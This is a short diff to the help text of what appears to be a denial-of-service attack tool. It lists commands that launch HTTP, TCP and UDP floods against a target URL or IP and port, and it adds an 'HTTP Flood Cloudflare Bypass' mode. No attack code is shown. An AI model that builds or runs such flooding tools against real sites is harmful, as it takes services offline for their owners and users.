@@ -12,6 +12,7 @@ attacks         Show currently running attacks.
 
 launch          Launch an attack. Usage:
                 launch http [URL] [DURATION] [CONCURRENCY]
+                launch hcf [URL] [DURATION] [CURRENCY] - HTTP Flood Cloudflare Bypass
                 launch tcp [IP:PORT] [DURATION] [CONCURRENCY]
                 launch udp [IP:PORT] [DURATION]
                 The minimum duration for every type of attack is 10,
